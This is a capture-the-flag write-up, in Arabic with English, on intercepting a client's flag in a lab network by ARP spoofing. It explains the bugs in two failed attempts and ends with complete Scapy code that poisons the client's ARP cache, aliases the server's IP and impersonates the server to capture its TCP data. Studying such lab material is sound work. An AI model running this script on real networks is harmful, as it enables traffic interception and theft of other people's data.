# ARP MITM Writeup — Intercepting Communication Challenge

**Category:** Network / Layer 2 Attack  
**Topic:** ARP Spoofing + TCP Interception  
**Difficulty:** Intermediate  

---

## Overview

الـ Challenge كان عبارة عن:
- **Client** `10.0.0.2` بيبعت الـ flag لـ **Server** `10.0.0.3` على port `31337`
- أنا على `10.0.0.1`
- المطلوب: اعترض الـ flag

```
Client (10.0.0.2) ──── FLAG ────► Server (10.0.0.3:31337)
                         ↑
                    أنا هنا (10.0.0.1)
```

## المحاولة الأولى — ARP Poison + Sniff فقط ❌

### الكود:

```python
from scapy.all import *

def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip),
                 psrc=spoof_ip, hwsrc=getmacbyip(spoof_ip))  # ← BUG هنا
    sendp(packet, iface='eth0', count=5)

arp_spoof("10.0.0.3", "10.0.0.2")
arp_spoof("10.0.0.3", "10.0.0.2")  # ← نفس الاتجاه مرتين! BUG

sniff(filter="tcp port 31337", prn=lambda p: print(p[Raw].load))
```

### المشاكل:

**Bug 1: `hwsrc=getmacbyip(spoofing_ip)` — ده مش spoofing!**

```
الـ ARP reply المفروض يقول:
"أنا الـ Server، وعنواني MAC بتاعي أنا (المهاجم)"

لكن الكود بيقول:
"أنا الـ Server، وعنواني MAC بتاع الـ Server الحقيقي"

= مش spoofing خالص! الـ traffic مش هيجيلك
```

**Bug 2: نفس الاتجاه مرتين:**
```python
arp_spoof("10.0.0.3", "10.0.0.2")  # poison الـ server
arp_spoof("10.0.0.3", "10.0.0.2")  # نفس الحاجة تاني!
# المفروض: arp_spoof("10.0.0.2", "10.0.0.3")  ← poison الـ client
```

**Bug 3 (الأهم): الـ sniff مش كافي!**

```
حتى لو الـ ARP Poison اشتغل صح:

Client بعت SYN → MAC بتاعك ✅
                      ↓
          Kernel شاف IP dst = 10.0.0.3
                      ↓
          "ده مش IP بتاعي! أنا 10.0.0.1"
                      ↓
              packet اتحذفت ❌
                      ↓
         Client مش لاقيش SYN-ACK
                      ↓
           connect() فشلت أو timeout
                      ↓
        sendall(flag) مش اتنفذت أصلاً ❌
```

**الـ sniff يقدر يشوف الـ packet على الـ wire، لكن الـ TCP stack مش بيشوفها!**

## المحاولة الثانية — ARP Poison + TCP Server ❌

### الكود:

```python
s = socket.socket()
s.bind(("0.0.0.0", 31337))
s.listen()
conn, addr = s.accept()  # ← مش بترجع أبداً!
```

### المشكلة: `0.0.0.0` مش معناها "كل حاجة"!

ده أكبر سوء فهم في الـ challenge:

```
"0.0.0.0" معناها:
"استقبل connections جاية لأي IP مسجل عندي"

IPs المسجلة عندي = 10.0.0.1 بس!

الـ packet جاي لـ IP = 10.0.0.3
Kernel: "10.0.0.3 مش عندي!" → حذف ❌

Socket: مش شايف حاجة أصلاً!
accept(): بتستنى للأبد ❌
```

## الحل النهائي — IP Alias + ARP Poison + TCP Server ✅

### الفكرة الجوهرية:

> لو الـ Kernel مش بيقبل الـ packet لأن الـ IP مش بتاعه،
> **سجّل الـ IP ده عنده!**

```bash
ip addr add 10.0.0.3/24 dev eth0
```

دلوقتي:
```
Kernel عنده:
  - 10.0.0.1 (الأصلي)
  - 10.0.0.3 (الجديد) ← انت بقيت الـ Server!
```

### الكود الكامل:

```python
from scapy.all import *
import threading
import socket
import subprocess
import time

iface      = "eth0"
my_mac     = get_if_hwaddr(iface)
client     = "10.0.0.2"
server     = "10.0.0.3"
client_mac = getmacbyip(client)

# Step 1: سجّل IP الـ Server عندك
subprocess.run(["ip", "addr", "add", "10.0.0.3/24", "dev", iface])
print("[+] Added 10.0.0.3 to eth0")

# Step 2: ARP Poison الـ Client
def arp_poison():
    while True:
        sendp(Ether(dst=client_mac) /
              ARP(op=2, pdst=client, hwdst=client_mac,
                  psrc=server, hwsrc=my_mac),
              iface=iface, verbose=False)
        time.sleep(1)

# Step 3: TCP Server يستقبل الـ Flag
def start_server():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("10.0.0.3", 31337))
    s.listen()
    print("[+] Listening as 10.0.0.3:31337")
    while True:
        conn, addr = s.accept()
        data = conn.recv(1024)
        print(f"\n[FLAG] {data.decode(errors='ignore')}\n")
        conn.close()

threading.Thread(target=arp_poison, daemon=True).start()
start_server()
```

### الـ Flow الكامل:

```
Client (10.0.0.2)
   │
   │ 1. ARP Cache: "10.0.0.3 = MAC بتاعك" ← من ARP Poison
   │
   │ 2. connect("10.0.0.3", 31337)
   │    Ethernet dst = MAC بتاعك ✅
   │    IP dst = 10.0.0.3 ✅
   ▼
أنت (10.0.0.1 + 10.0.0.3)
   │
   │ 3. Kernel: "10.0.0.3 = أنا!" ✅
   │ 4. TCP Stack: استقبل SYN ✅
   │ 5. accept() رجعت ✅
   │ 6. recv() → FLAG 🚩
```

## الدرس الأساسي — كل Layer محتاج Solution

```
┌─────────────────────────────────────────────────────┐
│  Layer 2 (Ethernet)                                 │
│  المشكلة: الـ frame مش بتيجيلك                      │
│  الحل: ARP Poison → hwsrc = MAC بتاعك               │
├─────────────────────────────────────────────────────┤
│  Layer 3 (IP)                                       │
│  المشكلة: الـ Kernel بيحذف الـ packet               │
│  الحل: ip addr add 10.0.0.3 → سجّل الـ IP عندك     │
├─────────────────────────────────────────────────────┤
│  Layer 4 (TCP)                                      │
│  المشكلة: الـ Handshake مش بيكتمل                   │
│  الحل: socket.bind("10.0.0.3", 31337)               │
└─────────────────────────────────────────────────────┘
```

**ARP Poisoning بيحل Layer 2 بس — مش Layer 3 أو 4!**
